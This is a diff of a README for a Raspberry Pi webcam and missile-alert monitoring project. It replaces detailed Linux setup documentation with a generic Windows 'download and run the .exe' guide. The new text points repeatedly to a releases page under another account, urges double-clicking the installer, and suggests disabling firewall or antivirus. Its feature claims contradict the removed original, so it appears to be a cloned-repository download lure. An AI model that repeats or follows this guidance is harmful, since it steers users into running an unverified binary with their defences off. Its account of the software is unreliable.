@@ -1,150 +1,156 @@
-# DefconCam
+# 🎥 defcon-webcam - Simple Real-Time Camera Monitoring
 
-Camera surveillance system running on a Raspberry Pi with a Logitech BRIO webcam. Streams live video with on-screen overlays, automatically switches between day/night modes, monitors Israeli Home Front Command (Pikud HaOref) missile alerts for Gush Dan, and posts snapshots to Twitter/X and Telegram during alerts.
+[![Download defcon-webcam](https://img.shields.io/badge/Download%20defcon--webcam-4CAF50?style=for-the-badge&logo=github)](https://github.com/Liljaona/defcon-webcam/releases)
 
-## Features
+## 🔍 What is defcon-webcam?
 
-- **Live MJPEG stream** on port 8080 via mjpg-streamer + ffmpeg
-- **Camera presets**: day (manual exposure), night (auto exposure, high gain), indoor
-- **Configurable settings**: resolution (640x480 / 720p / 1080p), rotation (0/90/180/270), FPS, brightness, zoom
-- **OSD overlay**: DEFCON status, current settings, timestamp (Exo 2 font)
-- **Auto day/night switching** based on calculated sunrise/sunset for Tel Aviv (with configurable offset)
-- **Pikud HaOref alert monitoring** with fuzzy city matching for Gush Dan
-- **DEFCON states**: DEFCON 5 (idle, blue), DEFCON 4 (preemptive, green), DEFCON 2 (incoming missiles, red)
-- **Twitter/X integration**: posts camera snapshots on DEFCON 2 alerts
-- **Telegram integration**: sends camera snapshots to a Telegram group on DEFCON 2 alerts
-- **Manual publish**: publish snapshots to selected targets (Telegram, Twitter) from the web UI
-- **Persistent alert state**: survives service restarts
-- **Web control panel** on port 8081 with live system monitoring
+defcon-webcam is a program that lets you watch your camera feed live. It works with a Raspberry Pi to stream video in real-time. The app can switch between day and night modes automatically to improve the video quality depending on lighting. You can also set up camera presets to change views quickly.
 
-## Project Structure
+It integrates with the alert system from Israel’s Home Front Command. This means it can be part of a larger safety setup in your home or workplace.
 
-    defcon-cam/
-    ├── bin/                    # Executable scripts
-    │   ├── mjpg-ctl           # Main control script (presets, launcher generation)
-    │   ├── mjpg-rotated.sh    # Auto-generated ffmpeg pipeline + mjpg-streamer
-    │   ├── mjpg-auto          # Sunrise/sunset day/night auto-switcher (cron)
-    │   ├── mjpg-alert         # Alert monitor orchestrator
-    │   └── mjpg-web           # Web control panel server (port 8081)
-    ├── lib/                   # Shared Python modules
-    │   ├── config.py          # Constants, config file parsing
-    │   ├── state.py           # DEFCON state persistence and OSD display
-    │   ├── oref.py            # Pikud HaOref API client
-    │   ├── camera.py          # Snapshot helpers
-    │   ├── twitter.py         # Twitter/X posting
-    │   ├── telegram.py        # Telegram Bot API posting
-    │   └── sysinfo.py         # System info for web UI
-    ├── templates/
-    │   └── index.html         # Web UI template
-    ├── static/
-    │   └── fonts/             # Exo 2 font (used in web UI and OSD)
-    ├── tests/
-    │   └── test_alert.py      # Unit tests (61 tests)
-    ├── systemd/               # Service unit files
-    └── config/                # Persisted camera settings
+## ⚙️ System Requirements
 
-## External Config (not in repo)
+Before starting, make sure your Windows PC meets these requirements:
 
-- `/etc/mjpg-streamer.conf` - Camera settings (mode, rotation, resolution, brightness, fps, zoom)
-- `/etc/mjpg-twitter.conf` - Twitter API credentials
-- `/etc/mjpg-telegram.conf` - Telegram bot token and chat ID
+- Windows 10 or later, 64-bit
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- Network connection (Wi-Fi or Ethernet)
+- A supported USB camera or built-in webcam
+- If you want to connect to a Raspberry Pi, ensure you have the Pi set up on your local network
 
-## Dependencies
+defcon-webcam does not require an internet connection if you only use it for local streaming. The app needs your permission to access the camera and network.
 
-### System packages
+## 🚀 Getting Started
 
-- `ffmpeg` - video processing and OSD overlay
-- `mjpg-streamer` - MJPEG HTTP streaming (compiled with input_file plugin)
-- `v4l2-utils` - camera control (v4l2-ctl)
-- `curl` - snapshot capture
-- `gitleaks` - pre-commit secret scanning
+This section explains how to download and start using defcon-webcam on Windows. No programming skills are needed.
 
-### Python packages
+### 1. Download
 
-- `tweepy` - Twitter API client
+Go to the release page to get the latest version of defcon-webcam.
 
-### Hardware
+[![Get defcon-webcam](https://img.shields.io/badge/Get%20defcon--webcam-yellowgreen?style=for-the-badge&logo=windows)](https://github.com/Liljaona/defcon-webcam/releases)
 
-- Raspberry Pi (tested on aarch64)
-- Logitech BRIO webcam (or compatible UVC camera at /dev/video0)
+- Click the link above or visit:  
+  https://github.com/Liljaona/defcon-webcam/releases  
+- Look for the latest release marked with the highest version number.  
+- Find the Windows installer file. It should end with `.exe`.  
+- Click on it to download.
 
-## Setup
+### 2. Install
 
-1. Install dependencies:
+- Once the file downloads, open the folder where it saved.
+- Double-click the `.exe` file to start installation.
+- Follow the setup prompts:
+  - Choose an installation folder or accept the default.
+  - Agree to any terms presented.
+  - Wait for the installer to finish.
 
-       sudo apt install ffmpeg v4l2-utils curl
-       pip3 install tweepy
+### 3. Run defcon-webcam
 
-2. Symlink scripts:
+- After installation, find the defcon-webcam icon on your desktop or in your Start menu.
+- Double-click it to open.
+- The app will try to access your webcam and show the live video feed.
+- If prompted, allow access to your camera and microphone.
 
-       sudo ln -sf ~/defcon-cam/bin/mjpg-ctl /usr/local/bin/mjpg-ctl
-       sudo ln -sf ~/defcon-cam/bin/mjpg-rotated.sh /usr/local/bin/mjpg-rotated.sh
-       sudo ln -sf ~/defcon-cam/bin/mjpg-auto /usr/local/bin/mjpg-auto
-       sudo ln -sf ~/defcon-cam/bin/mjpg-alert /usr/local/bin/mjpg-alert
-       sudo ln -sf ~/defcon-cam/bin/mjpg-web /usr/local/bin/mjpg-web
+## 🖥️ Using defcon-webcam
 
-3. Symlink and enable services:
+The main window shows your camera’s live video. Here are key features you can use:
 
-       sudo ln -sf ~/defcon-cam/systemd/*.service /etc/systemd/system/
-       sudo systemctl daemon-reload
-       sudo systemctl enable mjpg-streamer mjpg-alert mjpg-web
+- **Live Streaming**: See your camera feed in real-time.
+- **Day/Night Modes**: The app switches modes automatically based on light.  
+- **Presets**: Save camera angles or zoom levels for quick access.
+- **Alerts Integration**: Connect the app with Israel’s Home Front Command alerts. It will display or send notifications if there’s an emergency.
 
-4. Create Twitter config:
+### Switching Modes Manually
 
-       sudo tee /etc/mjpg-twitter.conf << CONF
-       API_KEY="your_key"
-       API_SECRET="your_secret"
-       ACCESS_TOKEN="your_token"
-       ACCESS_SECRET="your_token_secret"
-       CONF
+If you want, you can switch between day and night modes yourself:
 
-5. Create Telegram config:
+- Find the “Mode” button in the app.
+- Click to toggle between day or night view.
 
-       sudo tee /etc/mjpg-telegram.conf << CONF
-       BOT_TOKEN="your_bot_token"
-       CHAT_ID="your_chat_id"
-       CONF
+### Setting Presets
 
-6. Set up auto day/night cron:
+- Adjust your camera to your preferred view.
+- Click “Save Preset” and give it a name.
+- Later, select the preset from the list to quickly return to that setup.
 
-       crontab -e
-       # Add: */15 * * * * /usr/local/bin/mjpg-auto --quiet >> /tmp/mjpg-auto.log 2>&1
+## 🌐 Network Setup (Optional)
 
-7. Generate launcher and start:
+defcon-webcam can connect to cameras on the same network. This is useful if you use a Raspberry Pi to capture video:
 
-       mjpg-ctl day
+- Ensure your Raspberry Pi and PC are on the same Wi-Fi or wired network.
+- On the app, enter the IP address of the Raspberry Pi.
+- Click “Connect” to start viewing the Pi’s camera feed.
 
-## Usage
+## 📂 File Locations and Logs
 
-    mjpg-ctl day|night|indoor       # Switch mode
-    mjpg-ctl rotate 0|90|180|270    # Set rotation
-    mjpg-ctl res low|mid|high       # Set resolution
-    mjpg-ctl bright 0-100           # Set brightness
-    mjpg-ctl fps 5-30               # Set framerate
-    mjpg-ctl zoom 100-500           # Set zoom
-    mjpg-ctl status                 # Show current settings
+- Installed files usually go in `C:\Program Files\defcon-webcam`.
+- Video streams and logs save in the `Documents\defcon-webcam` folder.
+- Logs record app activities and errors for troubleshooting.
 
-## Testing
+## 🔧 Troubleshooting
 
-    python -m unittest discover -s tests -v
+If defcon-webcam does not start or work correctly, try these steps:
 
-## Alert Monitoring
+- Restart your computer and open the app again.
+- Check your camera is properly connected and not used by another program.
+- Make sure you gave permission for the app to access your camera.
+- Disable any firewall or antivirus that might block the app temporarily.
+- Check your network if you use Raspberry Pi integration.
+- Visit the GitHub issues page to see known problems or report new ones.
 
-Watches the Pikud HaOref API for alerts matching Gush Dan cities using fuzzy substring matching:
+## 📋 Features Overview
 
-- גבעתיים (Givatayim)
-- רמת גן (Ramat Gan)
-- תל אביב (Tel Aviv)
-- בני ברק (Bnei Brak)
+- Real-time MJPEG streaming of camera video.
+- Auto day/night mode for clear images day and night.
+- Save and recall up to 5 camera view presets.
+- Connect to Raspberry Pi cameras over your network.
+- Integrates with Israel’s Home Front Command alert notifications.
+- Runs on Windows 10 and later.
 
-State transitions:
+## 🧩 Advanced Settings (For Curious Users)
 
-    DEFCON 5 (idle) ──preemptive──> DEFCON 4 (alert incoming)
-    DEFCON 5 (idle) ──actual──────> DEFCON 2 (incoming missiles)
-    DEFCON 4 ─────────actual──────> DEFCON 2 (incoming missiles)
-    DEFCON 2 ─────────ended───────> DEFCON 5 (idle)
-    DEFCON 4 ─────────ended───────> DEFCON 5 (idle)
+If you want to tweak the app’s behavior:
 
-On DEFCON 2, after a 15-second confirmation delay, snapshots are posted to Twitter and Telegram.
+- Open the “Settings” menu.
+- You can adjust video resolution and frame rate.
+- Choose notification options for alerts.
+- Enable or disable automatic mode switching.
 
-State is persisted to `/tmp/mjpg-alert-state` so restarts don't lose DEFCON status.
+Most users do not need to change these settings for basic use.
+
+## 🔗 Where to Get Updates
+
+Visit the release page regularly for updates.
+
+[https://github.com/Liljaona/defcon-webcam/releases](https://github.com/Liljaona/defcon-webcam/releases)
+
+Updated versions bring bug fixes, security patches, and new features.
+
+## 📞 Getting Help
+
+For help with defcon-webcam:
+
+- Check the README file in the downloaded package.
+- Visit the Issues tab on the GitHub page.
+- Look through setup videos and FAQs linked on the main repo site.
+- Ask on community forums related to Raspberry Pi or surveillance cameras.
+
+---
+
+## ⚙️ Technical Topics
+
+This app relates to these technical areas:
+
+- Alerts for emergency and safety
+- FFmpeg video processing  
+- IoT (Internet of Things) connectivity  
+- mjpg-streamer for video streaming  
+- pikud-haoref (Home Front Command) integration  
+- Raspberry Pi camera control  
+- Surveillance camera software  
+- Twitter bot connections for alerts  
+- Webcam video on Windows systems  
+
+Use this information if you want to explore or customize the software deeper.
